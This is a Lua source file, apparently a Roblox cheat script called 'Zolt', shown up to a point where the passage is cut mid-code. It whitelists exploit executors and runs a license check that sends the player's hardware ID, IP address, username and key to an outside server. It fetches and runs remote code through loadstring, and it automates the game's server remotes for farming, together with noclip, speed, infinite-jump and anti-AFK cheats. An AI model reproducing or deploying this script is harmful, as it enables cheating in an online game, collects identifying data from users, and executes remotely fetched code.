local gameId = game.GameId
local sg = 9792947201

if gameId ~= sg then
    return
end

-- ═══════════════════════════════════════════════════════════════
-- EXECUTOR WHITELIST (из оригинального скрипта)
-- ═══════════════════════════════════════════════════════════════
local _allowedExecutors = {
    "AWP", "Volt", "ChocoSploit", "Seliware", "Wave", "Volcano",
    "Potassium", "SirHurt", "Fluxus", "Delta", "Krnl", "Synapse", "Velocity",
    "Nihon", "Madium", "Cosmic",
}
local _executor = identifyexecutor and identifyexecutor() or "Unknown"
local _allowed = false
for _, v in ipairs(_allowedExecutors) do
    if _executor:lower():find(v:lower()) then _allowed = true; break end
end
if not _allowed then
    game:GetService("Players").LocalPlayer:Kick('Your executor ("' .. _executor .. '") cannot run this script.')
    return
end

-- ═══════════════════════════════════════════════════════════════
-- LICENSE SYSTEM / WHITELIST (встроен из CRASH.txt)
-- ═══════════════════════════════════════════════════════════════
local function CRASH()
    local p = game.Players.LocalPlayer
    if p then
        p:Kick("An unexpected error occurred. [0x" .. string.format("%X", math.random(0x1000, 0xFFFF)) .. "]")
    end
    while true do wait(9e9) end
end

script_key = script_key or _G.script_key or "nil"
website = "https://cumarmor.vercel.app"

local jmp_counter = 0
local valid = false
local valid2 = false
local valid3 = true

do -- Anti Hooks
    jmp_counter += 1
end

pcall(function()
    do -- Functions / Encoding
        function encode_string(s) return s end
        function decode_string(s) return s end

        function split(str, sep)
            local result = {}
            local regex = ("([^%s]+)"):format(sep)
            for each in str:gmatch(regex) do
                table.insert(result, each)
            end
            return result
        end

        function generateRandomString(length)
            local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            local result = {}
            for i = 1, length do
                local randIndex = math.random(1, #charset)
                result[i] = charset:sub(randIndex, randIndex)
            end
            return table.concat(result)
        end

        function urlEncode(str)
            return string.gsub(str, "([^%w _%-%.~])", function(c)
                return string.format("%%%02X", string.byte(c))
            end):gsub(" ", "+")
        end

        function send(url)
            return request({Url = url, Method = "Post"})
        end
    end

    do -- Serials
        hwid = gethwid()
        ip = decode_string(request({Url = website .. "/data", Method = "GET"}).Body) or "Unknown"
        if #ip > 1000 then
            game.Players.LocalPlayer:Kick("Webserver is down, please dm fffrip on discord.")
        end
        ip = ip:gsub("%:", "")
    end

    do -- Sanity Check
        local check1 = math.random(1, 1000)
        local check2 = math.random(1, 1000)
        local check3 = math.random(1, 1000)
        local check4 = math.random(1, 1000)

        raw = check1 .. ":" .. check2 .. ":" .. check3 .. ":" .. check4
        encoded = encode_string(raw)

        local query_params = { data = encoded }
        local query_string = ""
        for key, value in pairs(query_params) do
            query_string = query_string .. urlEncode(key) .. "=" .. urlEncode(value) .. "&"
        end
        query_string = query_string:sub(1, -2)
        url = website .. "/hyperion?" .. query_string

        data = request({Url = url, Method = "Post"})

        if data.Body ~= nil then
            raw = decode_string(data.Body)
            split_string = split(raw, ":")
            if split_string[1] == "sanity_check"
                and tostring(check1) == split_string[2]
                and tostring(check2) == split_string[3]
                and tostring(check3) == split_string[4]
                and tostring(check4) == split_string[5] then
                -- Sanity check passed
            else
                CRASH()
            end
        else
            game.Players.LocalPlayer:Kick("Connection Failed - Webserver is down")
            wait(9e9)
        end
    end

    do -- Data
        if not trigger and not value then
            current = os.time()
            raw = generateRandomString(54) .. ":" .. generateRandomString(10) .. ":" .. "key:" .. os.date("%x") .. ":" .. current .. ":" .. script_key .. ":" .. game.Players.LocalPlayer.Name .. ":" .. hwid .. ":" .. ip .. ":" .. _executor .. ":" .. "2" .. ":" .. generateRandomString(14)
            encoded = encode_string(raw)

            local query_params = { data = encoded }
            local query_string = ""
            for key, value in pairs(query_params) do
                query_string = query_string .. urlEncode(key) .. "=" .. urlEncode(value) .. "&"
            end
            query_string = query_string:sub(1, -2)
            url = website .. "/auth?" .. query_string
            data = request({Url = url, Method = "Post"})
        else
            current = os.time()
            raw = value .. ":" .. generateRandomString(54) .. ":" .. generateRandomString(50) .. ":" .. "test:" .. ":" .. hwid .. ":" .. script_key .. ":" .. ip .. ":" .. value .. ":" .. 3 .. ":" .. generateRandomString(50)
            encoded = encode_string(raw)

            local query_params = { data = encoded }
            local query_string = ""
            for key, value in pairs(query_params) do
                query_string = query_string .. urlEncode(key) .. "=" .. urlEncode(value) .. "&"
            end
            query_string = query_string:sub(1, -2)
            url = website .. "/auth?" .. query_string
            data = request({Url = url, Method = "Post"})

            wait(9e9)
            while true do end
        end
    end

    do -- Valid Check
        if data.Body ~= nil then
            ping_raw = decode_string(data.Body)
            split_string = split(ping_raw, ":")
            offset = tonumber(split_string[#split_string - 2])
            if offset == nil then
                offset = tonumber(split_string[#split_string - 1])
            end
        end

        if offset == nil then
            local attempts = 0
            local max_attempts = 10
            repeat
                if attempts > max_attempts then
                    return print("Failed to connect to server.")
                else
                    attempts += 1
                end
                data = send(url)
                wait(2)
                ping_raw = decode_string(data.Body)
                split_string = split(ping_raw, ":")
                offset = tonumber(split_string[#split_string - 2])
                if offset == nil then
                    offset = tonumber(split_string[#split_string - 1])
                end
            until offset ~= nil
        end

        if split_string[2 + offset] == "valid" then
            jmp_counter += 1
            test = tonumber(split_string[1 + offset]) - current
            if test < 30 then
                jmp_counter += 1
                if split_string[4 + offset] == string.lower(script_key) then
                    jmp_counter += 1
                    if split_string[5 + offset] == string.lower(game.Players.LocalPlayer.Name) then
                        jmp_counter += 1
                        if split_string[6 + offset] == string.lower(hwid) then
                            jmp_counter += 1
                            if split_string[3 + offset] == string.lower(ip) then
                                if jmp_counter ~= 6 then
                                    CRASH()
                                end
                                valid = true
                                valid2 = true
                                valid3 = false
                            else
                                game.Players.LocalPlayer:Kick("IP mismatch")
                            end
                        else
                            game.Players.LocalPlayer:Kick("HWID mismatch")
                        end
                    else
                        game.Players.LocalPlayer:Kick("Username mismatch")
                    end
                else
                    game.Players.LocalPlayer:Kick("Key mismatch")
                end
            else
                game.Players.LocalPlayer:Kick("Time sync error")
            end
        elseif split_string[2 + offset] == "key" then
            game.Players.LocalPlayer:Kick("Invalid Key")
        elseif split_string[2 + offset] == "not_activated" then
            game.Players.LocalPlayer:Kick("Key not activated. Redeem your key in the Discord server first.")
        elseif split_string[2 + offset] == "hwid" then
            game.Players.LocalPlayer:Kick("Invalid HWID")
        elseif split_string[2 + offset] == "request" then
            game.Players.LocalPlayer:Kick("Bad Request")
        elseif split_string[2 + offset] == "expired" then
            game.Players.LocalPlayer:Kick("Key Expired")
        elseif split_string[2 + offset] == "time" then
            game.Players.LocalPlayer:Kick("Time sync error - sync your clock")
        elseif split_string[2 + offset] == "crack_detected" then
            game.Players.LocalPlayer:Kick("Crack detected")
        else
            game.Players.LocalPlayer:Kick("Error: " .. tostring(split_string[2 + offset]) .. " offset=" .. tostring(offset))
        end
    end
end)

do -- Script
    repeat wait() until valid and valid2 and not valid3

    if jmp_counter ~= 6 then
        CRASH()
    end

    if jmp_counter ~= 6 then
        CRASH()
    end

    if not (valid and valid2 and not valid3 and not trigger) then
        while true do end
    end
end

-- ═══════════════════════════════════════════════════════════════
-- ОСНОВНОЙ СКРИПТ (встроен напрямую, без loadstring)
-- ═══════════════════════════════════════════════════════════════

if _G.hf834fg83413 then
    return
end
_G.hf834fg83413 = true

local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

local Options = Library.Options
local Toggles = Library.Toggles

Library.ForceCheckbox = false
Library.ShowToggleFrameInKeybinds = true

local Window = Library:CreateWindow({
    Title = "Zolt",
    Footer = "version: public",
    Icon = 95027652189233,
    NotifySide = "Right",
    ShowCustomCursor = false,
    EnableCompacting = true,
    SidebarCompacted = true,
})

local Tabs = {
    Info = Window:AddTab({Name="Info",Icon="info",Description="Player information"}),
    AutoFarm = Window:AddTab({Name="Auto Farm",Icon="sprout",Description="Automated farming features"}),
    Misc = Window:AddTab({Name="Misc",Icon="table-of-contents",Description="Miscellaneous features"}),
    ["UI Settings"] = Window:AddTab({Name="UI Settings",Icon="settings",Description="Theme, keybinds and config"}),
}

local players = game:GetService("Players")
local local_player = players.LocalPlayer
local RunService = game:GetService("RunService")
local Debris = game:GetService("Debris")
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService("VirtualUser")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local UIS = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")

-- ═══════════════════════════════════════════════════════════════
-- КЭШИРОВАНИЕ REMOTES
-- ═══════════════════════════════════════════════════════════════
local _remotesCache = {}

local function getRSRemote(service)
    if _remotesCache[service] then
        return _remotesCache[service]
    end
    local remote = ReplicatedStorage
        :WaitForChild("Packages")
        :WaitForChild("_Index")
        :WaitForChild("leifstout_networker@0.3.1")
        :WaitForChild("networker")
        :WaitForChild("_remotes")
        :WaitForChild(service)
        :WaitForChild("RemoteFunction")
    _remotesCache[service] = remote
    return remote
end

-- ═══════════════════════════════════════════════════════════════
-- КЭШИРОВАНИЕ ДАННЫХ ИГРОКА
-- ═══════════════════════════════════════════════════════════════
local _character = local_player.Character or local_player.CharacterAdded:Wait()
local _humanoid = _character:WaitForChild("Humanoid")
local _hrp = _character:WaitForChild("HumanoidRootPart")
local _wsEnabled, _wsValue = false, 16

local_player.CharacterAdded:Connect(function(char)
    _character = char
    _humanoid = char:WaitForChild("Humanoid")
    _hrp = char:WaitForChild("HumanoidRootPart")
    if _wsEnabled then _humanoid.WalkSpeed = _wsValue end
end)

-- ═══════════════════════════════════════════════════════════════
-- INFO TAB
-- ═══════════════════════════════════════════════════════════════
local avatarUrl = players:GetUserThumbnailAsync(
    local_player.UserId,
    Enum.ThumbnailType.AvatarBust,
    Enum.ThumbnailSize.Size420x420
)
local InfoGroup = Tabs.Info:AddLeftGroupbox("Info", "user")
local ZoltGroup = Tabs.Info:AddRightGroupbox("Zolt")

ZoltGroup:AddImage("ZoltIcon", {Image="rbxassetid://95027652189233", Height=120})
InfoGroup:AddImage("PlayerAvatar", {Image=avatarUrl, Height=180})
InfoGroup:AddDivider()
InfoGroup:AddLabel({Text=string.format("Hello, <b>%s</b>!", local_player.Name), DoesWrap=false, Size=16})

local executorName = "Unknown"
if identifyexecutor then
    local ok, res = pcall(identifyexecutor)
    if ok then executorName = res end
end

InfoGroup:AddLabel({Text="Executor: <b>"..executorName.."</b>", DoesWrap=false, Size=14})

local _infoStartTime = tick()
local _playtimeLabel = InfoGroup:AddLabel({Text="Playtime: <b>00:00:00</b>", DoesWrap=false, Size=14})

RunService.Heartbeat:Connect(function()
    if tick() - _infoStartTime < 1 then return end
    local e = math.floor(tick() - _infoStartTime)
    _playtimeLabel:SetText(string.format("Playtime: <b>%02d:%02d:%02d</b>",
        math.floor(e/3600), math.floor((e%3600)/60), e%60))
end)

InfoGroup:AddDivider()
InfoGroup:AddButton({
    Text = "Discord",
    Func = function()
        setclipboard("https://discord.gg/K52D8NA8cD")
        Library:Notify("Discord link copied!", 3)
    end
})

-- ═══════════════════════════════════════════════════════════════
-- HELPER FUNCTIONS
-- ═══════════════════════════════════════════════════════════════
local function Roll()
    pcall(function()
        getRSRemote("RollService"):InvokeServer("requestRoll")
    end)
end

local function ClaimIndex()
    local remote = getRSRemote("IndexService")
    for _, reward in ipairs({"basic","big","huge","shiny","inverted"}) do
        pcall(function()
            remote:InvokeServer("requestClaimReward", reward)
        end)
        task.wait(0.1)
    end
end

local function ConsumePotions()
    local remote = getRSRemote("BoostService")
    for _, boost in ipairs({"luck","ultraLuck","currency","rollSpeed"}) do
        pcall(function()
            remote:InvokeServer("requestUseBoost", boost)
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════
-- ПОЛУЧЕНИЕ ИМЕНИ СЛАЙМА
-- ═══════════════════════════════════════════════════════════════
local _Slimes = nil
local _InventoryServiceUtils = nil

local function getSlimeName(uniqueId, inventoryData)
    pcall(function()
        if not _Slimes then
            _Slimes = require(ReplicatedStorage.Source.Game.Items.Slimes)
        end
        if not _InventoryServiceUtils then
            _InventoryServiceUtils = require(ReplicatedStorage.Source.Features.Inventory.InventoryServiceUtils)
        end
    end)

    if _Slimes and _InventoryServiceUtils and inventoryData then
        local slimeRaw = inventoryData[uniqueId]
        local ok, slimeData = pcall(function()
            return _InventoryServiceUtils.getSlimeData(uniqueId, slimeRaw)
        end)
        if ok and slimeData and slimeData.id then
            local ok2, slimeDef = pcall(function()
                return _Slimes.getSlime(slimeData.id)
            end)
            if ok2 and slimeDef and slimeDef.name then
                local level = slimeData.level or 1
                return slimeDef.name .. (level > 1 and (" Lv." .. level) or "")
            end
        end
    end
    return "Slime#" .. tostring(uniqueId):sub(1, 6)
end

-- ═══════════════════════════════════════════════════════════════
-- AUTO FEED
-- ═══════════════════════════════════════════════════════════════
local _skipNotifyLastTime = 0

local InventoryItemUtils = require(ReplicatedStorage.Source.Features.Inventory.InventoryItemUtils)

local function AutoFeed()
    local client = require(ReplicatedStorage.Packages.DataService).client
    local items     = client:get("items") or {}
    local inventory = client:get("inventory") or {}
    local equipped  = client:get("equipped") or {}

    local equippedIds = {}
    for slot, uniqueId in pairs(equipped) do
        if uniqueId and type(uniqueId) == "string" then
            table.insert(equippedIds, {slot = slot, uniqueId = uniqueId})
        end
    end
    if #equippedIds == 0 then
        Library:Notify({Title="Auto Feed", Description="No equipped slimes.", Time=4})
        return
    end

    local foodItems  = {}
    local fruitItems = {}

    for itemId, amount in pairs(items) do
        if type(amount) == "number" and amount > 0 then
            pcall(function()
                local def = InventoryItemUtils.getDefinition(itemId)
                if not def then return end
                if def.kind == "food" then
                    table.insert(foodItems, {id = itemId, name = def.name or itemId, amount = amount})
                elseif def.kind == "fruit" then
                    table.insert(fruitItems, {id = itemId, name = def.name or itemId, amount = amount})
                end
            end)
        end
    end

    local foodLog   = {}
    local fruitLog  = {}
    local skippedFruit = 0

    for _, slimeInfo in ipairs(equippedIds) do
        if not Toggles.AutoFeed.Value then break end
        local slimeName = getSlimeName(slimeInfo.uniqueId, inventory)

        for _, food in ipairs(foodItems) do
            if food.amount > 0 then
                local ok = pcall(function()
                    getRSRemote("InventoryService"):InvokeServer(
                        "requestUseFood", food.id, slimeInfo.uniqueId, 1
                    )
                end)
                if ok then
                    food.amount -= 1
                    table.insert(foodLog, {slime = slimeName, item = food.name})
                end
                task.wait(0.35)
                break
            end
        end
    end

    for _, slimeInfo in ipairs(equippedIds) do
        if not Toggles.AutoFeed.Value then break end
        local slimeRaw = inventory[slimeInfo.uniqueId]
        local hasTree = false
        if type(slimeRaw) == "table" and slimeRaw.unlockedTrees then
            hasTree = next(slimeRaw.unlockedTrees) ~= nil
        end

        if hasTree then
            skippedFruit += 1
        else
            local slimeName = getSlimeName(slimeInfo.uniqueId, inventory)
            for _, fruit in ipairs(fruitItems) do
                if fruit.amount > 0 then
                    local ok = pcall(function()
                        getRSRemote("InventoryService"):InvokeServer(
                            "requestUseFruit", fruit.id, slimeInfo.uniqueId
                        )
                    end)
                    if ok then
                        fruit.amount -= 1
                        table.insert(fruitLog, {slime = slimeName, item = fruit.name})
                    end
                    task.wait(0.35)
                    break
                end
            end
        end
    end

    if #foodLog > 0 then
        if #foodLog == 1 then
            Library:Notify({Title = "Auto Feed", Description = foodLog[1].item .. " → " .. foodLog[1].slime, Time = 5})
        elseif #foodLog <= 3 then
            for _, entry in ipairs(foodLog) do
                Library:Notify({Title = "Auto Feed", Description = entry.item .. " → " .. entry.slime, Time = 4})
                task.wait(0.4)
            end
        else
            local itemCounts = {}
            for _, entry in ipairs(foodLog) do
                itemCounts[entry.item] = (itemCounts[entry.item] or 0) + 1
            end
            local lines = {}
            for foodName, count in pairs(itemCounts) do
                table.insert(lines, foodName .. " ×" .. count)
            end
            Library:Notify({
                Title = "Auto Feed (" .. #foodLog .. " slimes)",
                Description = table.concat(lines, "\n"),
                Time = 6
            })
        end
    end

    if #fruitLog > 0 then
        if #fruitLog == 1 then
            Library:Notify({Title = "Auto Feed", Description = fruitLog[1].item .. " → " .. fruitLog[1].slime, Time = 5})
        elseif #fruitLog <= 3 then
            for _, entry in ipairs(fruitLog) do
                Library:Notify({Title = "Auto Feed", Description = entry.item .. " → " .. entry.slime, Time = 4})
                task.wait(0.4)
            end
        else
            local itemCounts = {}
            for _, entry in ipairs(fruitLog) do
                itemCounts[entry.item] = (itemCounts[entry.item] or 0) + 1
            end
            local lines = {}
            for fruitName, count in pairs(itemCounts) do
                table.insert(lines, fruitName .. " ×" .. count)
            end
            Library:Notify({
                Title = "Auto Feed (" .. #fruitLog .. " slimes)",
                Description = table.concat(lines, "\n"),
                Time = 6
            })
        end
    end

    if skippedFruit > 0 then
        if tick() - _skipNotifyLastTime >= 60 then
            _skipNotifyLastTime = tick()
            Library:Notify({
                Title = "Auto Feed - Skipped",
                Description = skippedFruit .. " slime(s) already have a fruit.",
                Time = 4
            })
        end
    end

    if #foodLog == 0 and #fruitLog == 0 and skippedFruit == 0 then
        Library:Notify({Title = "Auto Feed", Description = "Nothing to feed", Time = 4})
    end
end

-- ═══════════════════════════════════════════════════════════════
-- ЗОНЫ
-- ═══════════════════════════════════════════════════════════════
local function Teleport(worldNum)
    pcall(function()
        getRSRemote("ZonesService"):InvokeServer("requestTeleportZone", worldNum)
    end)
end

local _zonesCache = nil
local _zonesCacheTime = 0

local function GetBestZoneNumber()
    if tick() - _zonesCacheTime > 5 or not _zonesCache then
        _zonesCache = {}
        local zones = workspace:FindFirstChild("Zones")
        if zones then
            for _, zone in pairs(zones:GetChildren()) do
                local gate = zone:FindFirstChild("Gate")
                if gate then
                    local blockerName = "ClientGateBlocker_" .. zone.Name
                    local blocker = gate:FindFirstChild(blockerName)
                    if blocker and blocker.CanCollide == false then
                        local num = tonumber(zone.Name)
                        if num then table.insert(_zonesCache, num) end
                    end
                end
            end
        end
        _zonesCacheTime = tick()
    end

    local counter = 0
    for _, num in pairs(_zonesCache) do
        if num > counter then counter = num end
    end
    return counter > 0 and (counter + 1) or nil
end

local function GetZoneFarmPosition(zoneNum)
    local zones = workspace:FindFirstChild("Zones")
    if not zones then return nil end
    local zone = zones:FindFirstChild(tostring(zoneNum))
    if not zone then return nil end
    local spawnPoint = zone:FindFirstChild("SpawnLocation", true)
    if spawnPoint and spawnPoint:IsA("BasePart") then
        return spawnPoint.Position + Vector3.new(0, 3, 0)
    end
    if zone:IsA("Model") then
        local cf, size = zone:GetBoundingBox()
        return cf.Position + Vector3.new(0, 5, 0)
    elseif zone:IsA("BasePart") then
        return zone.Position + Vector3.new(0, 5, 0)
    end
    return nil
end

-- ═══════════════════════════════════════════════════════════════
-- NOCLIP HELPER
-- ═══════════════════════════════════════════════════════════════
local _noclipConnection = nil

local function EnableNoclip()
    if _noclipConnection then return end
    _noclipConnection = RunService.Stepped:Connect(function()
        if _character then
            for _, child in pairs(_character:GetDescendants()) do
                if child:IsA("BasePart") and child.CanCollide then
                    child.CanCollide = false
                end
            end
        end
    end)
end

local function DisableNoclip()
    if _noclipConnection then
        _noclipConnection:Disconnect()
        _noclipConnection = nil
    end
end

local function WalkToPoint(targetPos, timeout)
    if not _humanoid or not _hrp then return false end
    if not targetPos then return false end
    timeout = timeout or 30
    local reached = false
    local connection = nil
    connection = _humanoid.MoveToFinished:Connect(function(success)
        reached = success
    end)
    _humanoid:MoveTo(targetPos)
    local startTime = tick()
    while tick() - startTime < timeout do
        if not Toggles.AutoBestZone.Value then break end
        if reached then break end
        if not _humanoid or not _hrp then break end
        local distToTarget = (targetPos - _hrp.Position).Magnitude
        if _humanoid.MoveDirection.Magnitude < 0.1 and distToTarget > 5 then
            _humanoid:MoveTo(targetPos)
        end
        task.wait(0.3)
    end
    if connection then connection:Disconnect() end
    return reached
end

local _lastZone = nil

local function AutoBestZoneLogic()
    local bestZone = GetBestZoneNumber()
    if not bestZone then
        Library:Notify({Title = "Auto Best Zone", Description = "No zones found!", Time = 3})
        return
    end
    local client = require(ReplicatedStorage.Packages.DataService).client
    local currentZone = client:get("zone") or 1
    if currentZone == bestZone then
        local farmPos = GetZoneFarmPosition(bestZone)
        if farmPos and _hrp then
            local dist = (farmPos - _hrp.Position).Magnitude
            if dist > 15 then
                EnableNoclip()
                WalkToPoint(farmPos, 40)
                DisableNoclip()
            end
        end
        return
    end
    if _lastZone ~= bestZone then
        Library:Notify({Title = "Auto Best Zone", Description = "Teleporting to Zone " .. bestZone, Time = 3})
        _lastZone = bestZone
    end
    Teleport(bestZone)
    task.wait(3)
end

-- ═══════════════════════════════════════════════════════════════
-- АВТО-АПГРЕЙД
-- ═══════════════════════════════════════════════════════════════
local _upgradeTreeCache = nil
local _upgradeUtilsCache = nil

local function Upgrade()
    pcall(function()
        if not _upgradeTreeCache then
            _upgradeTreeCache = require(ReplicatedStorage.Source.Features.Upgrades.UpgradeTree)
            _upgradeUtilsCache = require(ReplicatedStorage.Source.Features.Upgrades.UpgradeServiceUtils)
        end
        local client = require(ReplicatedStorage.Packages.DataService).client
        local upgrades = client:get("upgrades") or {}

        for treeName, tree in pairs(_upgradeTreeCache) do
            for upgradeName, upgradeData in pairs(tree) do
                if upgrades[upgradeName] then continue end
                if not upgradeData.cost then continue end

                local depMet = upgradeData.dependency == _upgradeUtilsCache.enums.originDependency
                    or upgrades[upgradeData.dependency] == true
                if not depMet then continue end

                local cost = upgradeData.cost
                if not cost.currency or not cost.amount then continue end

                local balance = client:get(cost.currency) or 0
                if balance >= cost.amount then
                    getRSRemote("UpgradeService"):InvokeServer("requestUnlock", upgradeName)
                    task.wait(0.1)
                end
            end
        end
    end)
end

-- ═══════════════════════════════════════════════════════════════
-- СБОР ДРОПА
-- ═══════════════════════════════════════════════════════════════
local function CollectDrops()
    if not _hrp then return end
    local drops = workspace:FindFirstChild("Loot")
    if not drops then return end

    local processed = 0
    for _, drop in pairs(drops:GetChildren()) do
        if drop and drop:FindFirstChild("Root") then
            drop.Root.CFrame = _hrp.CFrame
            local attachment = drop.Root:FindFirstChild("Attachment")
            if attachment then
                local prox = attachment:FindFirstChild("ProximityPrompt")
                if prox then
                    pcall(function() fireproximityprompt(prox) end)
                end
            end
            processed += 1
            if processed >= 10 then break end
        end
    end
end

-- ═══════════════════════════════════════════════════════════════
-- AUTO FARM TAB
-- ═══════════════════════════════════════════════════════════════
local FarmLeftGroup  = Tabs.AutoFarm:AddLeftGroupbox("Farming", "zap")
local FarmRightGroup = Tabs.AutoFarm:AddRightGroupbox("Upgrades", "arrow-up")

FarmLeftGroup:AddToggle("AutoRoll", {
    Text = "Auto Roll",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoRoll.Value do
                pcall(Roll)
                task.wait(0.1)
            end
        end)
    end
})

FarmLeftGroup:AddToggle("AutoIndex", {
    Text = "Auto Index",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoIndex.Value do
                pcall(ClaimIndex)
                task.wait(5)
            end
        end)
    end
})

FarmLeftGroup:AddToggle("AutoDrops", {
    Text = "Auto Drops",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoDrops.Value do
                pcall(CollectDrops)
                task.wait(0.1)
            end
        end)
    end
})

FarmLeftGroup:AddToggle("AutoPotions", {
    Text = "Auto Potions",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoPotions.Value do
                pcall(ConsumePotions)
                task.wait(1)
            end
        end)
    end
})

FarmLeftGroup:AddToggle("AutoFeed", {
    Text = "Auto Feed",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoFeed.Value do
                pcall(AutoFeed)
                task.wait(2)
            end
        end)
    end
})

FarmLeftGroup:AddToggle("AutoBestZone", {
    Text = "Auto Best Zone",
    Default = false,
    Callback = function(v)
        if not v then
            DisableNoclip()
        end
        task.spawn(function()
            while Toggles.AutoBestZone.Value do
                pcall(AutoBestZoneLogic)
                local interval = Options.AutoBestZoneInterval and tonumber(Options.AutoBestZoneInterval.Value) or 5
                task.wait(interval)
            end
            DisableNoclip()
        end)
    end
})

FarmLeftGroup:AddInput("AutoBestZoneInterval", {
    Title = "Best Zone Interval",
    Default = "5",
    Placeholder = "5",
    Numeric = true,
    Finished = false,
    Callback = function() end
})

FarmRightGroup:AddToggle("AutoUpgrade", {
    Text = "Auto Upgrade",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoUpgrade.Value do
                pcall(Upgrade)
                local interval = Options.AutoUpgradeInterval and tonumber(Options.AutoUpgradeInterval.Value) or 5
                task.wait(interval)
            end
        end)
    end
})

FarmRightGroup:AddInput("AutoUpgradeInterval", {
    Title = "Upgrade Interval",
    Default = "5",
    Placeholder = "5",
    Numeric = true,
    Finished = false,
    Callback = function() end
})

FarmRightGroup:AddToggle("AutoBuyZone", {
    Text = "Auto Buy Zone",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoBuyZone.Value do
                pcall(function()
                    getRSRemote("ZonesService"):InvokeServer("requestPurchaseZone")
                end)
                task.wait(1)
            end
        end)
    end
})

FarmRightGroup:AddToggle("AutoBuyCraftMachine", {
    Text = "Auto Buy Craft Machine",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoBuyCraftMachine.Value do
                pcall(function()
                    local client = require(ReplicatedStorage.Packages.DataService).client
                    local unlocks = client:get("unlocks") or {}
                    local machineKey = "craftingMachine"

                    if not unlocks[machineKey] then
                        local ok = getRSRemote("CraftingService"):InvokeServer("requestUnlockMachine")
                        if ok then
                            Library:Notify({
                                Title = "Auto Buy Craft",
                                Description = "Crafting Machine purchased!",
                                Time = 3
                            })
                        end
                    else
                        Library:Notify({
                            Title = "Auto Buy Craft",
                            Description = "Already unlocked, disabling...",
                            Time = 3
                        })
                        Toggles.AutoBuyCraftMachine:SetValue(false)
                    end
                end)
                task.wait(2)
            end
        end)
    end
})

FarmRightGroup:AddToggle("AutoBuyXpTransfer", {
    Text = "Auto Buy Xp Transfer",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoBuyXpTransfer.Value do
                pcall(function()
                    local client = require(ReplicatedStorage.Packages.DataService).client
                    local unlocks = client:get("unlocks") or {}
                    local machineKey = "xpTransferMachine"

                    if not unlocks[machineKey] then
                        local ok, err = getRSRemote("XpTransferService"):InvokeServer("requestUnlockMachine")
                        if ok then
                            Library:Notify({
                                Title = "Auto Buy Xp Transfer",
                                Description = "XP Transfer Machine purchased!",
                                Time = 3
                            })
                        end
                    else
                        Library:Notify({
                            Title = "Auto Buy Xp Transfer",
                            Description = "Already unlocked, disabling...",
                            Time = 3
                        })
                        Toggles.AutoBuyXpTransfer:SetValue(false)
                    end
                end)
                task.wait(2)
            end
        end)
    end
})

local _rebirthUtilsCache = nil

FarmRightGroup:AddToggle("AutoRebirth", {
    Text = "Auto Rebirth",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoRebirth.Value do
                pcall(function()
                    if not _rebirthUtilsCache then
                        _rebirthUtilsCache = require(ReplicatedStorage.Source.Features.Rebirth.RebirthServiceUtils)
                    end
                    local client = require(ReplicatedStorage.Packages.DataService).client
                    local rebirths = client:get("rebirths") or 0
                    local goop = client:get("goop") or 0
                    local canAfford = _rebirthUtilsCache.canAffordRebirth(rebirths, goop)

                    if canAfford then
                        getRSRemote("RebirthService"):InvokeServer("requestRebirth")
                        Library:Notify({
                            Title = "Auto Rebirth",
                            Description = "Rebirthed! (#" .. tostring(rebirths + 1) .. ")",
                            Time = 3
                        })
                    end
                end)
                task.wait(1)
            end
        end)
    end
})

FarmRightGroup:AddToggle("AutoEquipBest", {
    Text = "Auto Equip Best",
    Default = false,
    Callback = function(v)
        task.spawn(function()
            while Toggles.AutoEquipBest.Value do
                pcall(function()
                    getRSRemote("InventoryService"):InvokeServer("requestEquipBest")
                end)
                task.wait(3)
            end
        end)
    end
})

-- ═══════════════════════════════════════════════════════════════
-- MISC TAB
-- ═══════════════════════════════════════════════════════════════
local MiscGroup = Tabs.Misc:AddLeftGroupbox("Misc", "eye")
local EnvGroup  = Tabs.Misc:AddRightGroupbox("Environment", "bell")

local miscCfg = { infinitejump = false, antiafk = false }

MiscGroup:AddToggle("MiscInfJump", {
    Text = "Infinite Jump",
    Default = false,
    Callback = function(v) miscCfg.infinitejump = v end
})

UIS.JumpRequest:Connect(function()
    if miscCfg.infinitejump and local_player.Character then
        local hum = local_player.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end
end)

MiscGroup:AddToggle("MiscAntiAfk", {
    Text = "Anti-AFK",
    Default = false,
    Callback = function(v)
        miscCfg.antiafk = v
        if v then
            task.spawn(function()
                while miscCfg.antiafk do
                    pcall(function()
                        local cam = workspace.CurrentCamera
                        local vpSize = cam.ViewportSize
                        local center = Vector2.new(vpSize.X / 2, vpSize.Y / 2)
                        local offset = Vector2.new(
                            math.random(-50, 50),
                            math.random(-50, 50)
                        )
                        local pos = center + offset
                        VirtualUser:CaptureController()
                        VirtualUser:ClickButton1(pos)
                    end)
                    task.wait(300)
                end
            end)
        end
    end
})

MiscGroup:AddToggle("MiscWalkSpeedEnabled", {
    Text = "Walk Speed",
    Default = false,
    Callback = function(v)
        _wsEnabled = v
        if not v then
            pcall(function()
                local hum = local_player.Character
                    and local_player.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum.WalkSpeed = 16 end
            end)
        end
    end
})

MiscGroup:AddSlider("MiscWalkSpeed", {
    Text = "Speed Value",
    Default = 16,
    Min = 0,
    Max = 250,
    Rounding = 0,
